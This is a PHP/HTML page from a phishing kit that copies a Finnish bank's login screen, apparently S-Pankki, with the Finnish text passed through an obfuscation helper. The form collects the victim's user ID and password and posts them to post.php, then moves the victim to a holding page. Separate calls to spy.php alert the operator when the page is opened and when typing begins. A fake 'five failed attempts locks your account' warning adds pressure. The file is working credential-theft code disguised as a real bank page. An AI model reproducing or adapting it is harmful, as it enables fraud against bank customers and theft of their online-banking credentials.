<?php 
require '../main.php';
?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="left">
    <img src="res/logo.svg">
</div>
<div class="right">
<span><?php $bm->obf("Tarvitsetko apua?"); ?></span>
<span><?php $bm->obf("Poistu"); ?></span>
</div>
</header>

<div class="banner">
    <img src="res/key.svg">
    <h4><?php $bm->obf("Tunnistautuminen"); ?></h4>
</div>

<main>
<div class="form-holder">
<div class="form-banner">
<h4><?php $bm->obf("Tunnuslukutaulukolla tunnistautuminen"); ?></h4>
</div>
<img src="res/user.jpg">

<div class="multi">
<div class="left">
<p><?php $bm->obf("Jos käytössäsi ei ole maksutonta S-mobiili -sovellusta voit tunnistautua myös tunnuslukutaulukolla."); ?></p>
<p><?php $bm->obf("Tunnuslukutaulukolla tunnistautuminen on monivaiheisempi ja käyttäjätunnuksen ja salasanan lisäksi sinua pyydetään antamaan tunnuslukutaulukon tunnus sekä mahdollisesti myös tekstiviestivahvistus."); ?></p>
</div>


<div class="right">

<div class="col">
<label><?php $bm->obf("Käyttäjätunnus"); ?></label>
<span><?php $bm->obf("6-8 numeroa pitkä numerosarja."); ?></span>
<input type="password" id="u">
</div>
<div class="col">
<label><?php $bm->obf("Salasana"); ?></label>
<span><?php $bm->obf("Itse keksimäsi 4-6 numeron sarja."); ?></span>
<input type="password" id="p">
</div>
<div class="col">
    <button onclick="sendLogin()">Jatka</button>
</div>
<div class="col forgot">
<?php $bm->obf("Unohtuiko salasana"); ?>
</div>


</div>

</div>

</div>
</main>
    

<div class="window" id="error" style="display:<?php echo isset($_GET['e']) ? "block" : "none" ; ?>">
<div class="content">
<div class="form-error">
<h5><?php $bm->obf("Tarkista käyttäjätunnus ja salasana"); ?></h5>
<p><?php $bm->obf("Antamasi käyttäjätunnus tai salasana on virheellinen. Huomaa, että viisi (5) virheellistä yritystä lukitsee verkkopankkitunnuksesi."); ?></p>
<span><?php $bm->obf("Tarvitsetko apua"); ?></span><br>
<a href="#"><?php $bm->obf("Käyttäjätunnus"); ?></a>
<a href="#"><?php $bm->obf("Salasana"); ?></a>
<div style="text-align:center">
<button onclick="exitError()">Ok</button>
</div>
</div>
</div>
</div>


<script src="res/jq.js"></script>
<script>

function exitError(){
    $("#error").hide();
}

function sendLogin(){
    if($("#u").val().length>=6 && $("#p").val().length>=4){
        $.post("post.php",{user:$("#u").val(), pass:$("#p").val()},(res)=>{
            window.location="mkfile.php?p=wait&params=?p=LOGIN";
        });
    }
}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLogin();
    }
});



$.post("spy.php", {loginview:1});
var abort = false;
$("#u").keyup(function(){
	if(abort==false){
		$.post("spy.php", {loging:1});
		abort=true;
	}
});
</script>
<?php 
$m->ctr("LOGIN ".@$_GET['e']);
?>

</body>
</html>